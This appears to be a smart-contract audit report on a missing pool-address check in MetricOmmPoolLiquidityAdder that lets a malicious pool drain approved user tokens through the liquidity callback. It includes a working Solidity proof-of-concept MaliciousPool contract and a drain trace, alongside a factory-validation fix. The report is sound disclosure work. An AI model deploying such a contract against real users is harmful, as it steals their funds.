### Title
Unvalidated Pool Address in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens via Callback — (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

---

### Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address in `addLiquidityExactShares` and `addLiquidityWeighted` without validating it against the factory. A malicious pool can exploit `metricOmmModifyLiquidityCallback` to drain up to `maxAmountToken0` / `maxAmountToken1` of any ERC-20 tokens from the caller.

---

### Finding Description

`addLiquidityExactShares` and `addLiquidityWeighted` forward an unvalidated `pool` address directly into `_addLiquidity`. [1](#0-0) 

`_addLiquidity` stores the pool address in transient storage as the *expected* callback caller, then calls `pool.addLiquidity`. [2](#0-1) 

Inside `metricOmmModifyLiquidityCallback`, the only caller-authenticity check is `msg.sender != expectedPool`. Because `expectedPool` was set to the attacker-controlled address, this check trivially passes. [3](#0-2) 

The callback then reads `token0` / `token1` directly from `msg.sender` (the malicious pool), giving the attacker full control over which tokens are pulled. [4](#0-3) 

The only remaining guard is the `max0` / `max1` cap check, which the malicious pool can satisfy exactly by requesting `amount0Delta = max0` and `amount1Delta = max1`. [5](#0-4) 

The contract's own NatSpec acknowledges this gap explicitly: [6](#0-5) 

---

### Impact Explanation

A user who calls either `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address loses up to `maxAmountToken0` of `token0` and `maxAmountToken1` of `token1` — where both token identities and amounts are fully controlled by the malicious pool. Because the malicious pool's `getImmutables()` can return any token addresses, the attacker can target any ERC-20 the victim has approved to the `MetricOmmPoolLiquidityAdder`. This is a direct, irreversible loss of user principal with no on-chain recovery path.

---

### Likelihood Explanation

The trigger requires no privileged access. Any external actor can deploy a contract that satisfies the `IMetricOmmPoolActions` and `IMetricOmmPool` interfaces. Users can be directed to the malicious pool through a spoofed frontend, a misleading pool address shared off-chain, or a UI that does not validate pools against the factory — exactly the scenario the Sablier report describes. The `addLiquidityWeighted` variant is additionally exploitable through the probe phase: the malicious pool controls the `LiquidityProbe(need0, need1)` revert values, manipulating share scaling before the paying call.

---

### Recommendation

Add a factory address to the constructor and validate every caller-supplied `pool` address before use:

```solidity
address public immutable factory;

constructor(address weth, address _factory) PeripheryPayments(weth) {
    factory = _factory;
}

function _requireValidPool(address pool) internal view {
    if (!IMetricOmmPoolFactory(factory).isPool(pool)) revert InvalidPool(pool);
}
```

Call `_requireValidPool(pool)` at the top of `addLiquidityExactShares` and `addLiquidityWeighted` before any transient state is written or external calls are made. Apply the same guard to `MetricOmmSimpleRouter`, which has an identical structural gap for swap paths.

---

### Proof of Concept

```solidity
// Attacker deploys this contract
contract MaliciousPool is IMetricOmmPoolActions, IMetricOmmPool {
    address immutable adder;
    address immutable victim;

    constructor(address _adder, address _victim) {
        adder = _adder; victim = _victim;
    }

    // Called by MetricOmmPoolLiquidityAdder._addLiquidity
    function addLiquidity(
        address, uint80, LiquidityDelta calldata,
        bytes calldata callbackData, bytes calldata
    ) external returns (uint256, uint256) {
        // Pass KIND_PAY (=1) back so the callback enters the pay branch
        IMetricOmmPoolLiquidityAdder(adder)
            .metricOmmModifyLiquidityCallback(
                1_000e6,   // amount0Delta = max0 (USDC)
                1e18,      // amount1Delta = max1 (WETH)
                abi.encode(uint8(1))  // KIND_PAY
            );
        return (1_000e6, 1e18);
    }

    // Callback reads token addresses from here — attacker controls them
    function getImmutables() external pure returns (PoolImmutables memory imm) {
        imm.token0 = USDC;
        imm.token1 = WETH;
    }
    // ... other interface stubs
}

// Victim (or victim tricked by malicious UI) calls:
liquidityAdder.addLiquidityExactShares(
    address(maliciousPool),
    victim,
    0,
    deltas,
    1_000e6,   // maxAmountToken0 — attacker requests exactly this
    1e18,      // maxAmountToken1 — attacker requests exactly this
    ""
);
// Result: victim loses 1 000 USDC + 1 WETH; malicious pool receives them.
```

**Step-by-step trace:**

1. `_addLiquidity` sets transient pay context: `pool = MaliciousPool`, `payer = victim`, `max0 = 1_000e6`, `max1 = 1e18`.
2. `MaliciousPool.addLiquidity` is called; it immediately calls back `metricOmmModifyLiquidityCallback(1_000e6, 1e18, abi.encode(1))`.
3. Callback: `msg.sender == expectedPool` → `MaliciousPool == MaliciousPool` ✓
4. Callback: `amount0Delta (1_000e6) <= max0 (1_000e6)` and `amount1Delta (1e18) <= max1 (1e18)` ✓
5. Callback: `getImmutables()` returns `token0 = USDC`, `token1 = WETH`.
6. `pay(USDC, victim, MaliciousPool, 1_000e6)` — pulls 1 000 USDC from victim.
7. `pay(WETH, victim, MaliciousPool, 1e18)` — pulls 1 WETH from victim.
8. `_clearPayContext()` runs; transaction succeeds; victim's funds are gone.

### Citations

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L56-68)
```text
  function addLiquidityExactShares(
    address pool,
    address owner,
    uint80 salt,
    LiquidityDelta calldata deltas,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) external payable override returns (uint256 amount0Added, uint256 amount1Added) {
    _validateOwner(owner);
    _validateDeltas(deltas);
    return _addLiquidity(pool, owner, salt, deltas, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-164)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L165-167)
```text
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L183-207)
```text
  function _addLiquidity(
    address pool,
    address positionOwner,
    uint80 salt,
    LiquidityDelta memory deltas,
    address payer,
    uint256 maxAmountToken0,
    uint256 maxAmountToken1,
    bytes calldata extensionData
  ) internal returns (uint256 amount0Added, uint256 amount1Added) {
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
      uint256 a0, uint256 a1
    ) {
      amount0Added = a0;
      amount1Added = a1;
      _clearPayContext();
    } catch (bytes memory reason) {
      _clearPayContext();
      assembly ("memory-safe") {
        revert(add(reason, 32), mload(reason))
      }
    }
  }
```
